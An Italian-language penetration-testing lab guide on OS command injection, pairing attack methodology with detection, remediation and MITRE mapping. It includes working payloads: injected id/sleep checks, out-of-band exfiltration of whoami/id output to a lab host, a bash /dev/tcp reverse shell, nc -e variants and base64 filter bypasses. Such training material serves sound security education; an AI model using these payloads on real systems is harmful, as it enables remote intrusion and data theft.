> [English](README.en.md) | **Italiano**

# OS command injection

> - **Fase:** Web Exploitation - OWASP A03:2021 Injection (input dell'utente concatenato in un comando di sistema)
> - **Visibilita:** Media/Alta - il processo web genera processi figli shell (pattern molto rilevabile da EDR/auditd); le varianti blind generano traffico in uscita o ritardi misurabili
> - **Prerequisiti:** un'applicazione che costruisce ed esegue un comando di sistema includendo input dell'utente (ping, conversioni, utility, chiamate a binari esterni)
> - **Natura del documento:** metodologia + payload pratici (verifica, blind/OOB, reverse shell) per ambiente di laboratorio. Nessuna azione distruttiva (no wiping/DoS); nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: eseguire comandi arbitrari sul sistema operativo del server sfruttando la concatenazione non sicura di input dell'utente in una chiamata a shell; qui limitato a comandi di verifica non distruttivi.

---

## Executive summary

La OS Command Injection e tra le vulnerabilita web a piu alto impatto: porta direttamente alla **Remote Code
Execution (RCE)** sul server. Si verifica quando un'applicazione costruisce un comando di sistema concatenando
input dell'utente e lo passa a una shell (`system()`, `exec()`, backtick, `os.system`, `Runtime.exec` con
shell). Usando i metacaratteri della shell (`;`, `|`, `&&`, `$()`, backtick), l'attaccante aggiunge comandi
propri a quello previsto.

A differenza di SQLi/LDAP/XPath, che restano nel dominio dei dati, la Command Injection esce dall'applicazione e
raggiunge il sistema operativo: l'attaccante esegue codice con i privilegi del processo web. Da li puo leggere
file, muoversi lateralmente e puntare all'escalation. La severity tipica e `Critico` (CVSS attorno a 9.8). Puo
essere "in-band" (l'output del comando compare nella risposta) o "blind" (nessun output: si usa time-based o
out-of-band).

## Contesto operativo (perche, prima del come)

La Command Injection si cerca dove l'app invoca funzionalita di sistema a partire da input: strumenti di rete
(ping, traceroute, nslookup), conversioni di file, generazione di report, chiamate a binari esterni. La decisione
operativa e distinguere il caso in-band (output visibile: verifica immediata) da quello blind (serve un canale
indiretto: ritardo temporale o richiesta in uscita verso un server controllato). La verifica iniziale e minima e
**non distruttiva**: si aggiunge un comando innocuo (`id`, `whoami`) dopo un separatore e si osserva l'output.

## Esecuzione / comandi

### Fase 1 - conferma della vulnerabilita (comando benigno)

Ipotizzando un parametro `host` passato a un comando `ping`, si appende un comando di verifica innocuo tramite un
separatore di shell:

```
# valore del parametro (forma didattica, comando di verifica NON distruttivo)
127.0.0.1; id
```

Output illustrativo (rappresentativo, nella risposta dell'app):

```
PING 127.0.0.1 ... 64 bytes from 127.0.0.1
uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- 'id' eseguito: command injection confermata
```

L'esecuzione di `id`/`whoami` conferma la RCE con i privilegi del processo web. I separatori comuni sono `;`,
`|`, `&&`, `$()` e i backtick; la scelta dipende dal contesto (shell, filtri presenti).

### Fase 2 - variante blind (time-based e out-of-band)

Se l'output non e riflesso, si conferma l'esecuzione in modo indiretto:

```bash
# Time-based: ritardo misurabile nella risposta
127.0.0.1; sleep 10
127.0.0.1 && ping -c 10 127.0.0.1

# Out-of-band (OOB): richiesta in uscita verso un host controllato (DNS/HTTP), osservata nei propri log
127.0.0.1; nslookup $(whoami).attacker.lab
127.0.0.1; curl http://10.10.14.5/$(id | base64 -w0)
```

Un ritardo di ~10s o una richiesta ricevuta sul proprio server confermano la RCE anche senza output in risposta.

### Fase 3 - da RCE a shell interattiva (lab)

Confermata la RCE, in laboratorio si ottiene una shell. Reverse shell bash (listener `nc -lvnp 4444`
sull'attaccante, IP/porta di lab):

```bash
# valore iniettato nel parametro vulnerabile
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

Varianti quando bash non e disponibile o e filtrata: `nc -e /bin/sh 10.10.14.5 4444`, `mkfifo`, reverse shell
Python/PHP (vedi [07-post-exploitation](<../../../07-post-exploitation/README.md>) e la pagina netcat). Bypass
filtri comuni: concatenazione (`w'h'oami`), separatori alternativi, `$IFS` al posto degli spazi, encoding del
comando in base64 con `echo ... | base64 -d | bash`.

## Analisi dei risultati

La conferma dell'esecuzione di un comando benigno dimostra la RCE: l'attaccante puo eseguire comandi arbitrari
con i privilegi del processo web (tipicamente un utente di servizio come `www-data`). La severity reale e
`Critico`: da qui si aprono lettura/scrittura di file, accesso a credenziali locali, movimento laterale ed
escalation (vedi modulo 04). Se il processo web gira con privilegi elevati o se da esso si puo scalare a root,
l'intero host e compromesso. Se l'applicazione non invoca mai una shell (usa API che passano gli argomenti come
array) il vettore e chiuso.

### Analisi teorica

La OS Command Injection e la forma piu diretta del problema dati/istruzioni [Su & Wassermann 2006]: l'input
dell'utente (dato) viene interpretato dalla shell come comando (istruzione). La radice e l'uso di una shell per
eseguire comandi costruiti per concatenazione. La contromisura definitiva e **non usare la shell**: invocare i
binari con API che passano gli argomenti come lista (`execve`, `subprocess.run([...])` senza `shell=True`,
`ProcessBuilder` con argomenti separati), cosi i metacaratteri restano dati inerti. In subordine: whitelist
rigorosa dell'input e principio del minimo privilegio per il processo web (contenimento del danno).

## Remediation (blue team)

**Rilevamento (EDR/auditd/SIEM).**
- Il processo del web server che genera processi figli shell (`sh`, `bash`, `cmd`, `powershell`): pattern molto
  anomalo e altamente indicativo.
- Input contenenti metacaratteri di shell (`;`, `|`, `&&`, `$()`, backtick) nei parametri.
- Ritardi anomali nelle risposte (time-based) o traffico in uscita inatteso dal web server (out-of-band).

**Hardening (secure coding).**
- Non invocare una shell: usare API che passano gli argomenti come array, senza interpretazione shell
  (contromisura primaria).
- Dove possibile, evitare del tutto la chiamata a comandi esterni usando librerie native.
- Whitelist rigorosa dell'input (es. per un host: solo caratteri validi di un hostname/IP).
- Eseguire il processo web con privilegi minimi; segmentare e limitare cio che puo raggiungere.

---

## Scenario reale: proiezione Post-Exploitation

> Vale per l'esito "RCE confermata" (severity Critico).

### Prospettiva attaccante (red team)

**Punto di partenza:** parametro che finisce in un comando di sistema, con esecuzione confermata (Fase 1).

**Passo successivo immediato:** ricognizione del contesto (utente, privilegi, file raggiungibili) con comandi
benigni, poi valutazione del percorso di escalation.

**Kill Chain proiettata:**

```
OS Command Injection (RCE come utente web)
        |
        v
Ricognizione locale: utente, privilegi, file di configurazione raggiungibili
        |
        v
Lettura credenziali / accesso a servizi interni (vedi 04-system-exploitation)
        |
        v
Privilege escalation locale -> root -> compromissione dell'host e pivoting
```

**Impatto potenziale:** dalla singola vulnerabilita web alla compromissione del server e, tramite pivoting,
della rete interna. Il collegamento naturale e con
[04-system-exploitation](<../../../04-system-exploitation/README.md>).

**Vettori di monetizzazione tipici:** compromissione del server (ransomware, cryptomining), esfiltrazione,
pivoting verso l'infrastruttura interna.

### Prospettiva difensore (blue team)

**Rilevamento:** web server che genera shell; metacaratteri nei parametri; ritardi o traffico in uscita anomali.

**Indicatori di Compromissione (IOC):**
- Processi `sh`/`bash`/`cmd` figli del processo web server.
- Parametri con `;`, `|`, `&&`, `$()`, backtick.
- Connessioni in uscita dal web server verso host non previsti (variante OOB).

**Contenimento:** blocco del pattern via WAF; isolamento dell'host; verifica dei processi e delle connessioni
recenti.

**Eradicazione e hardening:** eliminare la chiamata a shell (API con argomenti array); whitelist input; minimo
privilegio; code review dei punti che invocano comandi esterni.

**Lezione difensiva:** la Command Injection e il caso in cui l'injection esce dai dati e diventa codice sul
sistema. La difesa non e filtrare i "cattivi caratteri" ma non usare affatto la shell: separare comando e
argomenti a livello di API.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | intercetta e modifica i parametri; test di iniezione con comandi benigni |
| `commix` | exploit tool | cli - attivo | rilevamento e sfruttamento automatizzato (in lab autorizzato) di command injection |
| `curl` | http client | cli - attivo | invio manuale di richieste con payload di verifica |
| `subprocess` (array) / `ProcessBuilder` | api sicure | secure coding | esecuzione senza shell per la remediation (blue team) |

## Note di metodologia

In lab reale (es. DVWA, WebGoat o un target con funzionalita di rete) i dati da documentare come finding: la
conferma dell'esecuzione, il contesto dei privilegi, la shell ottenuta e l'eventuale percorso di escalation. Le
tecniche sono funzionanti: vanno eseguite solo in lab proprio o con autorizzazione, evitando azioni distruttive
(wiping, DoS) che esulano dallo scopo di un assessment.

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | sfruttamento della concatenazione non sicura di input in un comando di sistema. |
| execution | command and scripting interpreter: unix shell | `T1059.004` | esecuzione di comandi sul server tramite shell (contesto linux). |
| execution | command and scripting interpreter: windows command shell | `T1059.003` | esecuzione di comandi sul server tramite cmd (contesto windows). |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.md>) | os command injection | l'enumerazione individua le funzionalita che invocano comandi di sistema |
| os command injection (rce) | [04-system-exploitation](<../../../04-system-exploitation/README.md>) | la rce come utente web apre la privilege escalation locale |
| os command injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (niente shell, api con argomenti array) si collega al secure coding |

---

> **Nota:** Contenuto didattico. I payload sono funzionanti (verifica, blind/OOB, reverse shell) e vanno eseguiti esclusivamente su applicazioni di proprieta o con autorizzazione esplicita, in ambiente di laboratorio. IP/porte sono valori di lab; nessuna azione distruttiva (wiping/DoS) e inclusa. Gli output sono illustrativi.
